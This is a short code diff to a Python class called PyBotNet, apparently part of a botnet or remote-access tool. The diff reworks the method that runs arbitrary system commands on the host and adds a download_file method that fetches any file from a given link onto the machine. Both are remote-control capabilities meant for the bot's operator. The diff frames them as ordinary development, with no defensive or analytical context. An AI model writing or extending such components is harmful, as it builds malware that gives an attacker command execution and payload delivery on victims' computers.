@@ -1,6 +1,6 @@
 # import built-in & third-party modules
 import logging
-
+import re
 
 # import pybotnet modules
 from . import util
@@ -118,8 +118,15 @@ class PyBotNet:
 
     def run_command_in_system(self, command: str) -> str:
         '''run system command in console and return data'''
-        return scripts.execute_cmd('cmd '+command, self.logger)
+        return scripts.cmd(command, self.is_shell, self.logger)
 
     def run_ls(self, route: str) -> str:
         '''return list of directory or files'''
         return scripts.ls(route)
+
+    def download_file(self, download_link: str, file_name: str = False):
+        if not file_name:
+            file_name = re.findall(r'.*/(.*)$', download_link)
+            file_name = (file_name[0])
+
+        return scripts.download_manager(download_link, file_name)
